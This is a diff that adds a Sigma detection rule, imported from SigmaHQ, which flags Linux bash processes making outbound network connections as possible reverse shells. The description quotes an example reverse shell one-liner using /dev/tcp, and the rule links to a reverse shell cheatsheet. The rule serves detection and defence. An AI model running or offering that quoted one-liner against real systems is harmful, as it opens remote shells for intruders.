@@ -1,0 +1,37 @@
+id: sigmahq-sigma-83dcd9f6-9ca8-4af7-a16e-a1c7a6b51871
+name: Linux Reverse Shell Indicator
+description: Detects a bash contecting to a remote IP address (often found when actors
+  do something like 'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1')
+severity: critical
+enabled: false
+tags:
+  mitre:
+  - T1059.004
+  categories:
+  - endpoint
+references:
+- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/d9921e370b7c668ee8cc42d09b1932c1b98fa9dc/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
+logsource:
+  product: linux
+  category: network_connection
+detection:
+  selection:
+    Image|endswith: /bin/bash
+  filter:
+    DestinationIp:
+    - 127.0.0.1
+    - 0.0.0.0
+  condition: selection and not filter
+provenance:
+  source: SigmaHQ/sigma
+  source_id: 83dcd9f6-9ca8-4af7-a16e-a1c7a6b51871
+  source_commit: df5c6a6
+  license: DRL-1.1
+  license_url: https://github.com/SigmaHQ/Detection-Rule-License
+  imported_at: '2026-05-04'
+  imported_by: sigma_importer
+  upstream_path: rules/linux/network_connection/net_connection_lnx_back_connect_shell_dev.yml
+falsepositives:
+- Unknown
+notes:
+  quarantine_reason: 'upstream status: test'
